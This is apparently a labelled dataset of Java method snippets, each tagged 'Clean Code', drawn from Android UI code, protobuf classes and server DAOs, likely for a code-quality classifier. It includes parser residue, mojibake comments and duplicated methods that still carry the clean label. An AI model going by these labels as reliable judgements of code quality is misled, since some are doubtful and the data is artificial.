  RecyclerListView recyclerListView=(RecyclerListView)viewPagerFixed.getCurrentView();
  if (cacheCell.type == TYPE_DOCUMENTS) {
    if (!(recyclerListView.getAdapter() instanceof DocumentsAdapter)) {
      return;
    }
    DocumentsAdapter documentsAdapter=(DocumentsAdapter)recyclerListView.getAdapter();
    PhotoViewer.getInstance().setParentActivity(parentFragment);
    if (placeProvider == null) {
      placeProvider=new BasePlaceProvider();
    }
    placeProvider.setRecyclerListView(recyclerListView);
    if (fileIsMedia(fileInfo.file)) {
      ArrayList<Object> photoEntries=new ArrayList<>();
      photoEntries.add(new MediaController.PhotoEntry(0,0,0,fileInfo.file.getPath(),0,fileInfo.type == TYPE_VIDEOS,0,0,0));
      ;
      PhotoViewer.getInstance().openPhotoForSelect(photoEntries,0,PhotoViewer.SELECT_TYPE_NO_SELECT,false,placeProvider,null);
    }
 else {
      AndroidUtilities.openForView(fileInfo.file,fileInfo.file.getName(),null,parentFragment.getParentActivity(),null);
    }
  }
  if (cacheCell.type == TYPE_MUSIC) {
    if (MediaController.getInstance().isPlayingMessage(fileInfo.messageObject)) {
      if (!MediaController.getInstance().isMessagePaused()) {
        MediaController.getInstance().pauseMessage(fileInfo.messageObject);
      }
 else {
        MediaController.getInstance().playMessage(fileInfo.messageObject);
      }
    }
 else {
      MediaController.getInstance().playMessage(fileInfo.messageObject);
    }
  }
  return;
}",0,Clean Code
"@Override public boolean onCustomLayout(View view,int left,int top,int right,int bottom){
  int width=(right - left);
  int height=(bottom - top);
  boolean isPortrait=width < height;
  if (view == cameraPanel) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126 + 96),width,bottom - AndroidUtilities.dp(96));
      }
 else {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126),width,bottom);
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(right - AndroidUtilities.dp(126 + 96),0,right - AndroidUtilities.dp(96),height);
      }
 else {
        cameraPanel.layout(right - AndroidUtilities.dp(126),0,right,height);
      }
    }
    return true;
  }
 else   if (view == zoomControlView) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 96 + 38+ 50),width,bottom - AndroidUtilities.dp(126 + 96 + 38));
      }
 else {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 50),width,bottom - AndroidUtilities.dp(126));
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 96 + 38+ 50),0,right - AndroidUtilities.dp(126 + 96 + 38),height);
      }
 else {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 50),0,right - AndroidUtilities.dp(126),height);
      }
    }
    return true;
  }
 else   if (view == counterTextView) {
    int cx;
    int cy;
    if (isPortrait) {
      cx=(width - counterTextView.getMeasuredWidth()) / 2;
      cy=bottom - AndroidUtilities.dp(113 + 16 + 38);
      counterTextView.setRotation(0);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cy-=AndroidUtilities.dp(96);
      }
    }
 else {
      cx=right - AndroidUtilities.dp(113 + 16 + 38);
      cy=height / 2 + counterTextView.getMeasuredWidth() / 2;
      counterTextView.setRotation(-90);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cx-=AndroidUtilities.dp(96);
      }
    }
    counterTextView.layout(cx,cy,cx + counterTextView.getMeasuredWidth(),cy + counterTextView.getMeasuredHeight());
    return true;
  }
 else   if (view == cameraPhotoRecyclerView) {
    if (isPortrait) {
      int cy=height - AndroidUtilities.dp(88);
      view.layout(0,cy,view.getMeasuredWidth(),cy + view.getMeasuredHeight());
    }
 else {
      int cx=left + width - AndroidUtilities.dp(88);
      view.layout(cx,0,cx + view.getMeasuredWidth(),view.getMeasuredHeight());
    }
    return true;
  }
  return false;
}",0,Clean Code
"@Override public void doubleClicked(){
}
",0,Clean Code
"@NonNull public static String describeIntent(@NonNull Intent intent,String prefix){
  String action=intent.getAction();
  String data=intent.getDataString();
  String type=intent.getType();
  Set<String> categories=intent.getCategories();
  ComponentName cn=intent.getComponent();
  String packageName=intent.getPackage();
  int flags=intent.getFlags();
  Bundle extras=intent.getExtras();
  StringBuilder sb=new StringBuilder();
  if (action != null)   sb.append(prefix).append("" ACTION\t"").append(action).append(""\n"");
  if (data != null)   sb.append(prefix).append("" DATA\t"").append(data).append(""\n"");
  if (type != null)   sb.append(prefix).append("" TYPE\t"").append(type).append(""\n"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    String id=intent.getIdentifier();
    if (id != null)     sb.append(prefix).append("" IDENTIFIER\t"").append(id).append(""\n"");
  }
  if (categories != null) {
    for (    String category : categories) {
      sb.append(prefix).append("" CATEGORY\t"").append(category).append(""\n"");
    }
  }
  if (cn != null)   sb.append(prefix).append("" COMPONENT\t"").append(cn.flattenToString()).append(""\n"");
  if (packageName != null)   sb.append(prefix).append("" PACKAGE\t"").append(packageName).append(""\n"");
  if (flags != 0)   sb.append(prefix).append("" FLAGS\t0x"").append(Integer.toHexString(flags)).append(""\n"");
  if (extras != null) {
    for (    String key : extras.keySet()) {
      Pair<Integer,String> typeAndString=valueToParsableStringAndType(extras.get(key));
      if (typeAndString != null) {
        sb.append(prefix).append("" EXTRA\t"").append(key).append(""\t"").append(typeAndString.first);
        if (typeAndString.first != TYPE_NULL) {
          sb.append(""\t"").append(typeAndString.second);
        }
        sb.append(""\n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * <code>optional uint32 cur_chat_bubble = 10;</code>
 * @return this
 */
public SelectChatBubbleScRsp clearCurChatBubble(){
  bitField0_&=~0x00000002;
  curChatBubble=0;
  return this;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockMultiOutputInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockMultiOutputInfoProto other=(org.tribuo.test.protos.MockMultiOutputInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountsList().equals(other.getCountsList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getLabelCounter() != other.getLabelCounter())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
",0,Clean Code
"void initializedComment(IFunction function,List<CommentType> comment);
",0,Clean Code
"private static String getAppPath(){
  try {
    String jarPath=System.getProperty(""project.path"");
    return FileUtil.getParent(jarPath,4);
  }
 catch (  Exception e) {
    log.error(""getAppPath error"",e);
    return null;
  }
}",0,Clean Code
"void accept(int node,float score);
",0,Clean Code
"@Override public Color getBorderColor(){
  return new Color(m_borderColor.getRGB());
}
",0,Clean Code
"@Override public Optional<Resource> getResource(ResourceLocation id){
  final String path=id.getPath();
  if (path.endsWith(""json"")) {
    return Optional.of(new StringResource(id,json));
  }
 else   if (path.endsWith(""vsh"")) {
    return Optional.of(new StringResource(id,vertex));
  }
 else   if (path.endsWith(""gsh"")) {
    if (geometry == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,geometry));
  }
 else   if (path.endsWith(""tcs"")) {
    if (tessControl == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessControl));
  }
 else   if (path.endsWith(""tes"")) {
    if (tessEval == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessEval));
  }
 else   if (path.endsWith(""fsh"")) {
    return Optional.of(new StringResource(id,fragment));
  }
  return Optional.empty();
}
",0,Clean Code
"private CRFParametersProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CRFParametersProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4b0cc719",0,Clean Code
"public void onDetachedFromWindow(){
  if (!attachedToWindow) {
    return;
  }
  attachedToWindow=false;
  if (currentImageLocation != null || currentMediaLocation != null || currentThumbLocation != null || staticThumbDrawable != null) {
    if (setImageBackup == null) {
      setImageBackup=new SetImageBackup();
    }
    setImageBackup.mediaLocation=currentMediaLocation;
    setImageBackup.mediaFilter=currentMediaFilter;
    setImageBackup.imageLocation=currentImageLocation;
    setImageBackup.imageFilter=currentImageFilter;
    setImageBackup.thumbLocation=currentThumbLocation;
    setImageBackup.thumbFilter=currentThumbFilter;
    setImageBackup.thumb=staticThumbDrawable;
    setImageBackup.size=currentSize;
    setImageBackup.ext=currentExt;
    setImageBackup.cacheType=currentCacheType;
    setImageBackup.parentObject=currentParentObject;
  }
  if (!ignoreNotifications) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.didReplacedPhotoInMemCache);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.stopAllHeavyOperations);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.startAllHeavyOperations);
  }
  if (staticThumbDrawable instanceof AttachableDrawable) {
    ((AttachableDrawable)staticThumbDrawable).onDetachedFromWindow(this);
  }
  if (staticThumbDrawable != null) {
    setStaticDrawable(null);
    thumbShader=null;
    roundPaint.setShader(null);
  }
  clearImage();
  if (isPressed == 0) {
    pressedProgress=0f;
  }
  AnimatedFileDrawable animatedFileDrawable=getAnimation();
  if (animatedFileDrawable != null) {
    animatedFileDrawable.removeParent(this);
  }
  RLottieDrawable lottieDrawable=getLottieAnimation();
  if (lottieDrawable != null) {
    lottieDrawable.removeParentView(this);
  }
}",0,Clean Code
"private static BiomeCategories getBiomeCategory(Holder<Biome> holder){
  if (holder.is(BiomeTags.WITHOUT_WANDERING_TRADER_SPAWNS)) {
    return BiomeCategories.NONE;
  }
 else   if (holder.is(BiomeTags.HAS_VILLAGE_SNOWY)) {
    return BiomeCategories.ICY;
  }
 else   if (holder.is(BiomeTags.IS_HILL)) {
    return BiomeCategories.EXTREME_HILLS;
  }
 else   if (holder.is(BiomeTags.IS_TAIGA)) {
    return BiomeCategories.TAIGA;
  }
 else   if (holder.is(BiomeTags.IS_OCEAN)) {
    return BiomeCategories.OCEAN;
  }
 else   if (holder.is(BiomeTags.IS_JUNGLE)) {
    return BiomeCategories.JUNGLE;
  }
 else   if (holder.is(BiomeTags.IS_FOREST)) {
    return BiomeCategories.FOREST;
  }
 else   if (holder.is(BiomeTags.IS_BADLANDS)) {
    return BiomeCategories.MESA;
  }
 else   if (holder.is(BiomeTags.IS_NETHER)) {
    return BiomeCategories.NETHER;
  }
 else   if (holder.is(BiomeTags.IS_END)) {
    return BiomeCategories.THE_END;
  }
 else   if (holder.is(BiomeTags.IS_BEACH)) {
    return BiomeCategories.BEACH;
  }
 else   if (holder.is(BiomeTags.HAS_DESERT_PYRAMID)) {
    return BiomeCategories.DESERT;
  }
 else   if (holder.is(BiomeTags.IS_RIVER)) {
    return BiomeCategories.RIVER;
  }
 else   if (holder.is(BiomeTags.HAS_CLOSER_WATER_FOG)) {
    return BiomeCategories.SWAMP;
  }
 else   if (holder.is(BiomeTags.PLAYS_UNDERWATER_MUSIC)) {
    return BiomeCategories.UNDERGROUND;
  }
 else   if (holder.is(BiomeTags.WITHOUT_ZOMBIE_SIEGES)) {
    return BiomeCategories.MUSHROOM;
  }
 else   if (holder.is(BiomeTags.IS_MOUNTAIN)) {
    return BiomeCategories.MOUNTAIN;
  }
 else {
    return BiomeCategories.PLAINS;
  }
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 7;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableBattleInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getBattleInfo(){
  return battleInfo;
}",0,Clean Code
"@Override public long getGuildId(){
  return 0;
}",0,Clean Code
"public Pair<RawFunction,RawFunction> getMatchedFunctionPairAt(final int index){
  return matchedFunctionPairs.get(index);
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.locationPermissionGranted) {
    locationDenied=false;
    askedForLocation=false;
    positionMarker();
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
    if (map != null) {
      try {
        map.setMyLocationEnabled(true);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
 else   if (id == NotificationCenter.locationPermissionDenied) {
    locationDenied=true;
    askedForLocation=false;
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
  }
  fixLayoutInternal(true);
  searchItem.setVisibility(locationDenied && !parentAlert.isStoryLocationPicker || parentAlert.isBizLocationPicker ? View.GONE : View.VISIBLE);
}
",0,Clean Code
"@Override public LeaveRogueScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  rogueInfo.clear();
  lineup.clear();
  scene.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 miracle_id = 3;</code>
 * @param value the miracleId to set
 * @return this
 */
public SelectRogueMiracleCsReq setMiracleId(final int value){
  bitField0_|=0x00000001;
  miracleId=value;
  return this;
}",0,Clean Code
"private Function2Nodes(){
}",0,Clean Code
"private ImmutableLabelInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableLabelInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  count_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@776adf0e",0,Clean Code
"private void writeObject(ObjectOutputStream stream) throws IOException {
  stream.write(data.length);
  stream.write(data);
}
",0,Clean Code
"@Override public TimestampData getTimestamp(int i,int precision){
  if (valueVector instanceof TimeStampSecVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampSecTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecTZVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampMilliVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMilliTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliTZVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMicroVector) {
    long micros=((TimeStampMicroVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampMicroTZVector) {
    long micros=((TimeStampMicroTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampNanoVector) {
    long nanos=((TimeStampNanoVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
 else {
    long nanos=((TimeStampNanoTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
}",0,Clean Code
"/** 
 * 灏嗘湭鐭ョ被鍨嬭浆鎹负鐩爣绫诲瀷
 */
@SneakyThrows public static Object typeStrConvertObject(Object obj,Class<?> targetType){
  String str=obj.toString();
  if (NumberUtils.isCreatable(str)) {
    if (str.endsWith("".0"")) {
      str=str.substring(0,str.length() - 2);
    }
  }
  if (int.class == targetType || Integer.class == targetType) {
    return Integer.valueOf(str);
  }
 else   if (short.class == targetType || Short.class == targetType) {
    return Short.valueOf(str);
  }
 else   if (long.class == targetType || Long.class == targetType) {
    return Long.valueOf(str);
  }
 else   if (float.class == targetType || Float.class == targetType) {
    return Float.valueOf(str);
  }
 else   if (double.class == targetType || Double.class == targetType) {
    return Double.valueOf(str);
  }
 else   if (BigDecimal.class == targetType) {
    return new BigDecimal(str);
  }
 else   if (boolean.class == targetType || Boolean.class == targetType) {
    return Boolean.valueOf(str);
  }
 else   if (targetType.isEnum()) {
    return targetType.getMethod(""valueOf"",String.class).invoke(targetType,str);
  }
 else {
    return str;
  }
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueAvatar}
 */
public static ChessRogueAvatar newInstance(){
  return new ChessRogueAvatar();
}
",0,Clean Code
"/** 
 * <code>optional .BuffInfo add_buff_info = 7;</code>
 * @return whether the addBuffInfo field is set
 */
public boolean hasAddBuffInfo(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"public void setClassLoader(ClassLoader classLoader){
  if (mPrefsMap.getBoolean(""system_ui_plugin_enable_volume_blur""))   EnableVolumeBlur.initEnableVolumeBlur(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_smart_hub_entry"",0) != 0)   HideMiSmartHubEntry.initHideMiSmartHubEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_play_entry"",0) != 0)   HideMiPlayEntry.initHideMiPlayEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_device_ctrl_entry"",0) != 0)   HideDeviceControlEntry.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_cc_bluetooth_tile_style"",1) > 1)   BluetoothTileStyle.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getBoolean(""system_framework_volume_separate_control"") && mPrefsMap.getBoolean(""system_framework_volume_separate_slider""))   NotificationVolumeSeparateSlider.initHideDeviceControlEntry(classLoader);
  if (isMoreHyperOSVersion(1f) && mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect""))   CCGridForHyperOS.initCCGridForHyperOS(classLoader);
  if (mPrefsMap.getBoolean(""system_cc_volume_showpct_title""))   ShowVolumePct.init(classLoader);
  if (mPrefsMap.getBoolean(""system_ui_unlock_super_volume""))   SuperVolume.initSuperVolume(classLoader);
  if ((mPrefsMap.getInt(""system_control_center_cc_rows"",4) > 4 || mPrefsMap.getInt(""system_control_center_cc_columns"",4) > 4 || mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect"") || mPrefsMap.getBoolean(""system_control_center_qs_tile_label"")) && !isMoreHyperOSVersion(1f)) {
    CCGrid.loadCCGrid(classLoader);
  }
  if (mPrefsMap.getBoolean(""system_ui_control_center_qs_open_color"") || mPrefsMap.getBoolean(""system_ui_control_center_qs_big_open_color""))   QSColor.pluginHook(classLoader);
  List<String> mCardStyleTiles=getTileList();
  if (mPrefsMap.getBoolean(""systemui_plugin_card_tiles_enabled"") && !mPrefsMap.getString(""systemui_plugin_card_tiles"","""").isEmpty()) {
    CustomCardTiles.initCustomCardTiles(classLoader,mCardStyleTiles);
  }
}",0,Clean Code
"/** 
 * 鑾峰彇鏉′欢鑺傜偣鐨勬墍鏈夋潯浠跺垎鏀�
 * @param flowId
 * @param version
 * @return
 */
List<FlowCondition> getByFlowId(Long flowId,Integer version);
",0,Clean Code
"public String getEmojiPackageId(){
  return this.emojiPackageId;
}
",0,Clean Code
"public String getEmbeddingColumnName(){
  return this.embeddingColumnName;
}
",0,Clean Code
"@Override protected void clearStore(){
  log.debug(""Deleting the search index"");
  AzureAiSearchContentRetriever azureAiSearchContentRetriever=contentRetrieverWithVector;
  try {
    azureAiSearchContentRetriever.deleteIndex();
    azureAiSearchContentRetriever.createOrUpdateIndex(dimensions);
  }
 catch (  RuntimeException e) {
    log.error(""Failed to clean up the index. You should look at deleting it manually."",e);
  }
}
",0,Clean Code
"public RedisPollDataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
}
",0,Clean Code
"private FMRegressionModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FMRegressionModelProto(){
  dimensionNames_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1a409f35",0,Clean Code
"public JedisProxy(@Qualifier(DEFAULT_CLIENT_INJECTION_NAME) JedisCommands jedisCommands){
  this.jedisCommands=jedisCommands;
}
",0,Clean Code
"/** 
 * <code>optional uint32 round_count = 2;</code>
 * @return the roundCount
 */
public int getRoundCount(){
  return roundCount;
}",0,Clean Code
"/** 
 * <code>repeated .RogueRoom room_list = 3;</code>
 * @return whether the roomList field is set
 */
public boolean hasRoomList(){
  return (bitField0_ & 0x00000010) != 0;
}",0,Clean Code
"List<Message> getMessages(String queue);
",0,Clean Code
"@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws IOException, SecurityManagerException {
  return delegate.hasElement(securityManager,uri);
}
@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws SecurityManagerException {
  securityManager.checkResolveModule(uri);
  return FileResolver.hasElement(uri);
}
@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws SecurityManagerException {
  securityManager.checkResolveModule(uri);
  return resolver.hasElement(uri);
}
@Override public boolean hasElement(SecurityManager manager,URI uri) throws SecurityManagerException {
  manager.checkResolveModule(uri);
  var uriPath=uri.getPath();
  assert uriPath.charAt(0) == '/';
  return classLoader.getResource(uriPath.substring(1)) != null;
}
@Override public boolean hasElement(SecurityManager securityManager,URI elementUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveModule(elementUri);
  var assetUri=PackageAssetUri.create(elementUri);
  return getPackageResolver().hasElement(assetUri,assetUri.getPackageUri().getChecksums());
}
@Override public boolean hasElement(SecurityManager securityManager,URI elementUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveModule(elementUri);
  var packageAssetUri=PackageAssetUri.create(elementUri);
  var dependency=getProjectDepsResolver().getResolvedDependency(packageAssetUri.getPackageUri());
  var path=getLocalPath(dependency,packageAssetUri);
  if (path != null) {
    securityManager.checkResolveModule(path.toUri());
    return FileResolver.hasElement(path);
  }
  var dep=(Dependency.RemoteDependency)dependency;
  assert dep.getChecksums() != null;
  return getPackageResolver().hasElement(packageAssetUri,dep.getChecksums());
}",0,Clean Code
"/** 
 * Compatible with old formats
 */
private String buildRowKeyExpress(Object rowKeyInfo){
  if (rowKeyInfo == null) {
    return null;
  }
  if (rowKeyInfo instanceof String) {
    return rowKeyInfo.toString();
  }
  if (!(rowKeyInfo instanceof List)) {
    return null;
  }
  StringBuilder expressBuilder=new StringBuilder();
  for (  Map item : ((List<Map>)rowKeyInfo)) {
    Object indexObj=item.get(COLUMN_INDEX_KEY);
    if (indexObj != null) {
      int index=Integer.parseInt(String.valueOf(indexObj));
      if (index >= 0) {
        expressBuilder.append(String.format(""$(%s)"",columnNames.get(index)));
        continue;
      }
    }
    String value=(String)item.get(COLUMN_VALUE_KEY);
    if (StringUtils.isNotEmpty(value)) {
      expressBuilder.append(value);
    }
  }
  return expressBuilder.toString();
}",0,Clean Code
"public SynchronizedMapSerializer(Fury fury,Class cls,Function factory,long offset){
  super(fury,cls,false);
  this.factory=factory;
  this.offset=offset;
}
",0,Clean Code
"@Override public void searched(final List<Integer> rowIndices,final boolean selectResultsOnly){
  final Set<Pair<RawFunction,RawFunction>> functionPairs=new HashSet<>();
  final MatchedFunctionsViewsTableModel tableModel=(MatchedFunctionsViewsTableModel)matchedFunctionsViewTable.getTableModel();
  final CTableSorter sorterModel=matchedFunctionsViewTable.getModel();
  final ListSelectionModel selectionModel=matchedFunctionsViewTable.getSelectionModel();
  for (  final Integer index : rowIndices) {
    final int modelIndex=sorterModel.modelIndex(index);
    if (selectResultsOnly) {
      selectionModel.addSelectionInterval(index,index);
    }
 else {
      functionPairs.add(tableModel.getMatchedFunctionPairAt(modelIndex));
    }
  }
  if (!selectResultsOnly) {
    tableModel.setMatchedFunctionPairs(functionPairs);
    tableModel.fireTableDataChanged();
  }
  if (rowIndices.size() > 0) {
    clearButton.setIcon(ICON_CLEAR);
  }
 else {
    clearButton.setIcon(ICON_CLEAR_GRAY);
  }
  updateUI();
}",0,Clean Code
"public static void addF8(FlatBufferBuilder builder,double f8){
  builder.addDouble(8,f8,0.0);
}",0,Clean Code
"ContainerInstance parse(DeploymentNodeDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  String containerIdentifier=tokens.get(IDENTIFIER_INDEX);
  Element element=context.getElement(containerIdentifier,Container.class);
  if (element == null) {
    throw new RuntimeException(""The container \"""" + containerIdentifier + ""\"" does not exist"");
  }
  DeploymentNode deploymentNode=context.getDeploymentNode();
  Set<String> deploymentGroups=new HashSet<>();
  if (tokens.includes(DEPLOYMENT_GROUPS_TOKEN)) {
    String token=tokens.get(DEPLOYMENT_GROUPS_TOKEN);
    String[] deploymentGroupReferences=token.split("","");
    for (    String deploymentGroupReference : deploymentGroupReferences) {
      Element e=context.getElement(deploymentGroupReference);
      if (e instanceof DeploymentGroup) {
        deploymentGroups.add(e.getName());
      }
    }
  }
  ContainerInstance containerInstance=deploymentNode.add((Container)element,deploymentGroups.toArray(new String[]{}));
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    containerInstance.addTags(tags.split("",""));
  }
  if (context.hasGroup()) {
    containerInstance.setGroup(context.getGroup().getName());
    context.getGroup().addElement(containerInstance);
  }
  return containerInstance;
}
",0,Clean Code
"private void exportProcedure(Connection connection,String schemaName,String procedureName,StringBuilder sqlBuilder) throws SQLException {
  String sql=String.format(PROCEDURE_DDL_SQL,schemaName,procedureName);
  try (ResultSet resultSet=connection.createStatement().executeQuery(sql)){
    if (resultSet.next()) {
      sqlBuilder.append(resultSet.getString(""ddl"")).append(""\n"");
    }
  }
 }
",0,Clean Code
"public GroupDetailInfo(){
  this.ownerUid="""";
  this.groupName="""";
  this.fingerMemo="""";
  this.groupQuestion="""";
  this.richFingerMemo="""";
  this.tagRecord=new ArrayList<>();
  this.groupMemo="""";
  this.cmdUinMsgMask=GroupMsgMask.values()[0];
  this.cmdUinPrivilege=MemberRole.values()[0];
  this.remarkName="""";
}
public GroupDetailInfo(long j2,String str,int i2,int i3,int i4,int i5,int i6,int i7,String str2,String str3,String str4,int i8,String str5,ArrayList<GroupTagRecord> arrayList,int i9,int i10,int i11,int i12,int i13,int i14,int i15,int i16,int i17,int i18,String str6,int i19,int i20,int i21,GroupMsgMask groupMsgMask,int i22,MemberRole memberRole,int i23,int i24,String str7,boolean z){
  this.ownerUid="""";
  this.groupName="""";
  this.fingerMemo="""";
  this.groupQuestion="""";
  this.richFingerMemo="""";
  this.tagRecord=new ArrayList<>();
  this.groupMemo="""";
  this.cmdUinMsgMask=GroupMsgMask.values()[0];
  this.cmdUinPrivilege=MemberRole.values()[0];
  this.remarkName="""";
  this.groupCode=j2;
  this.ownerUid=str;
  this.groupFlag=i2;
  this.groupFlagExt=i3;
  this.maxMemberNum=i4;
  this.memberNum=i5;
  this.groupOption=i6;
  this.classExt=i7;
  this.groupName=str2;
  this.fingerMemo=str3;
  this.groupQuestion=str4;
  this.certType=i8;
  this.richFingerMemo=str5;
  this.tagRecord=arrayList;
  this.shutUpAllTimestamp=i9;
  this.shutUpMeTimestamp=i10;
  this.groupTypeFlag=i11;
  this.privilegeFlag=i12;
  this.groupSecLevel=i13;
  this.groupFlagExt3=i14;
  this.isConfGroup=i15;
  this.isModifyConfGroupFace=i16;
  this.isModifyConfGroupName=i17;
  this.groupFlagExt4=i18;
  this.groupMemo=str6;
  this.cmdUinMsgSeq=i19;
  this.cmdUinJoinTime=i20;
  this.cmdUinUinFlag=i21;
  this.cmdUinMsgMask=groupMsgMask;
  this.groupSecLevelInfo=i22;
  this.cmdUinPrivilege=memberRole;
  this.cmdUinFlagEx2=i23;
  this.appealDeadline=i24;
  this.remarkName=str7;
  this.isTop=z;
}",0,Clean Code
"Object deepCopyValue(Object value){
  if (value == null) {
    return null;
  }
  if (value instanceof Bundle) {
    return ((Bundle)value).deepCopy();
  }
 else   if (value instanceof PersistableBundle) {
    return ((PersistableBundle)value).deepCopy();
  }
 else   if (value instanceof ArrayList) {
    return deepcopyArrayList((ArrayList)value);
  }
 else   if (value.getClass().isArray()) {
    if (value instanceof int[]) {
      return ((int[])value).clone();
    }
 else     if (value instanceof long[]) {
      return ((long[])value).clone();
    }
 else     if (value instanceof float[]) {
      return ((float[])value).clone();
    }
 else     if (value instanceof double[]) {
      return ((double[])value).clone();
    }
 else     if (value instanceof Object[]) {
      return ((Object[])value).clone();
    }
 else     if (value instanceof byte[]) {
      return ((byte[])value).clone();
    }
 else     if (value instanceof short[]) {
      return ((short[])value).clone();
    }
 else     if (value instanceof char[]) {
      return ((char[])value).clone();
    }
  }
  return value;
}
",0,Clean Code
"public void allowScreenshots(boolean allowScreenshots){
  if (BuildVars.DEBUG_PRIVATE_VERSION) {
    return;
  }
  allowScreenshots=!isShowing || allowScreenshots;
  if (this.allowScreenshots != allowScreenshots) {
    this.allowScreenshots=allowScreenshots;
    if (surfaceView != null) {
      surfaceView.setSecure(!allowScreenshots);
    }
    if (ATTACH_TO_FRAGMENT) {
      if (fragment.getParentActivity() != null) {
        if (allowScreenshots) {
          fragment.getParentActivity().getWindow().clearFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
 else {
